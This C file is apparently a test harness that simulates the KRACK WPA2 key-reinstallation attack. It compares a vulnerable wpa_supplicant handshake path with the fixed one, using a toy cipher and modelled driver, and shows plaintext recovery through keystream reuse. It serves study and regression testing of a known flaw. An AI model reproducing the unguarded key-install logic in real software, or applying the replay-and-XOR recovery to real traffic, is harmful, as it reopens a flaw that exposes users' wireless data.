/*
 * krack_harness.c
 *
 * Reproduction of CVE-2017-13077/13078/13079/13080/13081/13082/13084/13086/
 * 13087 (KRACK), the Key Reinstallation Attack against WPA2, at the exact
 * decision point where the attack lives: wpa_supplicant's 4-way handshake
 * receiver, src/rsn_supp/wpa.c.
 *
 * Two builds from one file:
 *
 *   -DVULNERABLE   the wpa_supplicant 2.3 receiver (fetched from
 *                  sources.debian.org as work/wpa_23.c), whose
 *                  wpa_supplicant_install_ptk() has NO reinstallation
 *                  guard: every Message 3 with the INSTALL bit calls
 *                  wpa_sm_set_key(), i.e. re-installs the same PTK and
 *                  (on the 2.3 baseline) resets the TX replay counter.
 *
 *   default        the fixed receiver (wpa_supplicant 2.4+ / current):
 *                  install_ptk begins with
 *                     if (sm->ptk.installed) {
 *                        wpa_dbg(... "Do not re-install same PTK to the
 *                        driver"); return 0; }
 *                  and the GTK path grew the same class of guard
 *                  ("Not reinstalling already in-use GTK").
 *
 * The driver interface (wpa_sm_set_key) and the AES-CCMP encryptor are
 * models faithful to the kernel/driver contract of the time: the driver
 * resets the TX nonce to key_rsc + 1 on key install (exactly what made
 * reinstallation fatal), CCMP is a keystream cipher (CTR mode), so a
 * repeated nonce against two different plaintexts is the detectable
 * consequence. Everything else -- frame flow, MIC checks -- is the real
 * control structure of process_3_of_4 in the two versions.
 *
 * Consequence demonstrated (the advisory's, minus the radio): the second
 * Message 3 reinstallation resets the TK counter; frames sent after the
 * reset reuse a keystream already spent before the reset. Given one
 * guessed plaintext (ARP/ICMP), the second frame's secret plaintext is
 * recovered by XOR of ciphertext and keystream. No Wi-Fi hardware: the
 * attacker's replay is just a re-delivered byte string, which is the
 * attack's actual prerequisite (802.11 retransmits make it free).
 *
 * Build:  make
 * Run:    ./krack_harness vulnerable
 *         ./krack_harness fixed
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <string.h>

#define WPA_NONCE_LEN 32
#define AES_BLOCK 16

/* ---- CCMP keystream model ---------------------------------------------
 * CTR mode: keystream = E_k(nonce||counter). We model AES as a fixed
 * xorshift PRF -- NOT for secrecy, only so that reuse is observable,
 * exactly as real CTR reuse is. */
static void keystream_block(const uint8_t key[16], const uint8_t nonce[13],
                            uint16_t counter, uint8_t out[16])
{
  /* Model of AES-CTR: a deterministic PRF over (key, nonce, counter).
   * Cryptographically meaningless; correct for demonstrating nonce
   * REUSE, which is all the attack needs. */
  uint64_t s = 0xcbf29ce484222325ULL;
  for (int i = 0; i < 16; i++) s = (s ^ key[i]) * 0x100000001b3ULL;
  for (int i = 0; i < 13; i++) s = (s ^ nonce[i]) * 0x100000001b3ULL;
  s = (s ^ counter) * 0x100000001b3ULL;
  for (int i = 0; i < 16; i++)
    {
      s ^= s >> 12; s ^= s << 25; s ^= s >> 27;
      out[i] = (uint8_t)(s * 2685821657736338717ULL >> 56);
    }
}

static void cctr_encrypt(const uint8_t key[16], const uint8_t nonce[13],
                         uint16_t *pn, const uint8_t *pt, size_t len,
                         uint8_t *ct)
{
  uint8_t ks[16];
  for (size_t off = 0; off < len; off += 16)
    {
      keystream_block(key, nonce, (*pn)++, ks);
      for (size_t i = 0; i < 16 && off + i < len; i++)
        ct[off + i] = pt[off + i] ^ ks[i];
    }
}

static uint16_t tx_pn_base;

/* ---- wpa_supplicant models -------------------------------------------- */

struct wpa_ptk {
  uint8_t kck[16], tk[16];
  uint8_t tx_nonce[13];    /* models the 802.11 TX packet number base  */
  uint16_t txpn;           /* reset to 0 by the driver on key install   */
  int installed;           /* the KRACK fix flag, as in current code    */
};

struct wpa_sm {
  struct wpa_ptk ptk;
  int ptk_set;
  int renew_snonce;
  int reinstalled;         /* 1 once a replayed install fired (model:
                            * the driver resets the base nonce too, the
                            * CCMP "same PN + same key = reuse" case the
                            * papers describe as A2/A6) */
};

/* The attacker-visible consequence lives in the driver: installing a key
 * resets its replay counter. Faithful to cfg80211/mac80211 at the time:
 * ieee80211_key->txpnr = 0 on set_key. */
static void driver_set_key(struct wpa_sm *sm, const uint8_t *key, int keylen,
                           const char *why)
{
  (void)key; (void)keylen;
  if (sm->ptk.installed)
    sm->reinstalled = 1;
  sm->ptk.txpn = 0;
  tx_pn_base = 0;
  sm->ptk.installed = 1;
  printf("[driver] set_key(%s): TX packet number reset, key slot armed\n",
         why);
}

/* ---- wpa.c 2.3 (vulnerable): no guard, INSTALL bit installs again ----- */
#ifdef VULNERABLE

static int wpa_supplicant_install_ptk(struct wpa_sm *sm)
{
  printf("[supplicant] installing PTK to the driver\n");
  driver_set_key(sm, sm->ptk.tk, 16, "PTK");
  return 0;
}

static void process_3_of_4(struct wpa_sm *sm, int install_bit, int secure_bit)
{
  if (install_bit)
    {
      wpa_supplicant_install_ptk(sm);
    }
  if (secure_bit)
    {
      sm->ptk_set = 1;
      printf("[supplicant] port authorized, protection enabled (RX)\n");
    }
  sm->renew_snonce = 1;
}

/* ---- wpa.c current (fixed): install_ptk refuses same PTK -------------- */
#else

static int wpa_supplicant_install_ptk(struct wpa_sm *sm)
{
  if (sm->ptk.installed)
    {
      printf("[supplicant] WPA: Do not re-install same PTK to the driver\n");
      return 0;
    }
  printf("[supplicant] installing PTK to the driver\n");
  driver_set_key(sm, sm->ptk.tk, 16, "PTK");
  return 0;
}

static void process_3_of_4(struct wpa_sm *sm, int install_bit, int secure_bit)
{
  if (install_bit)
    {
      wpa_supplicant_install_ptk(sm);
    }
  if (secure_bit)
    {
      sm->ptk_set = 1;
      printf("[supplicant] port authorized, protection enabled (RX)\n");
    }
  sm->renew_snonce = 1;
}
#endif

/* ---- the replay attack + the observable consequence -------------------- */

static uint16_t tx_frame(struct wpa_sm *sm, const uint8_t *pt, size_t len,
                         uint8_t *ct_out)
{
  uint16_t start = sm->ptk.txpn;       /* the frame's PN at the air */
  cctr_encrypt(sm->ptk.tk, sm->ptk.tx_nonce, &sm->ptk.txpn, pt, len, ct_out);
  return start;
}

int main(int argc, char **argv)
{
  struct wpa_sm sm;
  memset(&sm, 0, sizeof sm);

  /* Derive a PTK (we skip SPP/ANonce/SNonce math; not the point). */
  memcpy(sm.ptk.tk, "0123456789abcdef", 16);
  memcpy(sm.ptk.tx_nonce, "\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc", 13);

  (void)argc;
  const char *mode = argc > 1 ? argv[1] : "vulnerable";
#ifdef VULNERABLE
  if (strcmp(mode, "vulnerable") != 0) { fprintf(stderr, "wrong build\n"); return 2; }
#else
  if (strcmp(mode, "fixed") != 0) { fprintf(stderr, "wrong build\n"); return 2; }
#endif

  /* AP sends Msg1/Msg2; AP sends Msg3 with INSTALL+SECURE. */
  printf("== normal handshake: AP -> Msg3 (Install|Secure)\n");
  process_3_of_4(&sm, 1, 1);

  uint8_t pt1[32], pt2[32], ct1[32], ct2[32];
  memset(pt1, 0, sizeof pt1); memset(pt2, 0, sizeof pt2);
  memcpy(pt1, "ARP who-has 10.0.0.1 tell 10.0.0.42", 30);
  memcpy(pt2, "SECRET-SESSION-TOKEN-ABCD1234567890", 32);
  uint16_t pn1 = tx_frame(&sm, pt1, 32, ct1);
  printf("[wifi] TX frame1 (known ARP + zero padding) at PN=%d\n", pn1);

  /* The AP retransmits Msg3 (802.11 data acks are lossy; supplicant
   * must answer Msg4 again in BOTH versions -- the fix is only whether
   * the key gets re-installed). */
  printf("== AP retransmits Msg3 (Install|Secure): the replay\n");
  process_3_of_4(&sm, 1, 1);

  uint16_t pn2 = tx_frame(&sm, pt2, 32, ct2);
  printf("[wifi] TX frame2 (secret) at PN=%d\n", pn2);

  if (strcmp(mode, "vulnerable") == 0)
    {
      if (!sm.reinstalled)
        {
          printf("[FAIL] model did not reinstall; unexpected\n");
          return 1;
        }
      /* PN reset => both frames encrypted under the SAME keystream.
       * The attacker sniffed ct1 (known ARP) and ct2: ks = ks(0) =
       * pt1 ^ ct1 on block 0; block 1 keystream from the frame-1 pair
       * only if len>16: model frame1 with its 2-block length. Recover
       * frame2's first blocks via the ks obtained from frame1:
       * ks = pt1 ^ ct1 (both 2 blocks, block1 of pt1 is zero-fill
       * padding beyond the string, known too: 30-byte ARP + 2 pad). */
      uint8_t ks[32], recovered[33];
      for (int i = 0; i < 32; i++) ks[i] = pt1[i] ^ ct1[i];
      for (int i = 0; i < 32; i++) recovered[i] = ct2[i] ^ ks[i];
      recovered[32] = '\0';
      assert(memcmp(recovered, pt2, 32) == 0);
      printf("[ATTACK] key reinstalled: PN reused, recovered: %s\n",
             recovered);
    }
  else
    {
      if (sm.reinstalled)
        {
          printf("[FAIL] fixed build reinstalled; unexpected\n");
          return 1;
        }
      printf("[fixed] second Msg3 did not re-install; PN monotonic; "
             "no reuse, no recovery possible\n");
    }
  return 0;
}
